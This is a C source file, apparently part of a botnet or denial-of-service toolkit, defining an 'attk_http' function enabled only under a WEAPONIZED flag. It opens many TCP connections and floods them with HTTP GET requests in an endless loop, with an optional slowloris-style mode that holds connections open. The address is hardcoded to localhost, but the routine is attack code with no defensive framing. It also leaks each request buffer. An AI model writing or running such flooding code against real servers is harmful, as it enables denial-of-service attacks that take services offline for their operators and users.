#include "../include/main.h"

#ifdef WEAPONIZED

void attk_http(uint32_t max, uint16_t port, uint8_t mode, uint16_t sleeptime, char *dir)
{
	uint32_t i;


	struct http_t
	{
		int32_t sock; // Shouldn't be unsigned
		uint16_t sleep;
		uint8_t state;
	} http[max];

	struct sockaddr_in addr = {0};
	addr.sin_addr.s_addr = ipv4_pack(127, 0, 0, 1);
	addr.sin_family = AF_INET;
	addr.sin_port = htons(port); // Set our port

	for (i = 0; i < max; i++)
	{
		http[i].state = 0;
		http[i].sleep = sleeptime;
	}

	while (1)
	{
		for (i = 0; i < max; i++)
		{
			switch (http[i].state)
			{
				case 0:
				{
					// Connect
					http[i].sock = socket(AF_INET, SOCK_STREAM, 0);
					if (http[i].sock == (int32_t) -1)
					return;
					if (connect(http[i].sock, (struct sockaddr *) &addr, sizeof(addr)) < 0)
					continue; // If we fail move to the next
					// one
					// When we get back we will try again
					else
					http[i].state = 1;
					continue; // Move to next i
				}
				case 1:
				{
					// Send data
					char *message;
					asprintf(&message, "GET %s\r\n\r\n", dir);
					if (send(http[i].sock, message, strlen(message), 0) < 0)
					{
					http[i].state = 0;
					continue;
					}
					// Use state 2 if we are slowlorois
					if (mode)
					http[i].state = 2;

					continue; // Move to next i
				}
				case 2:
				{
					// Sleep until we need to send data
					// This is only if we are using a slowlorious
					// like attack
					sleep(http[i].sleep);
					continue; // Move to next i
				}
			}
		}
	}
	return;
}

#endif
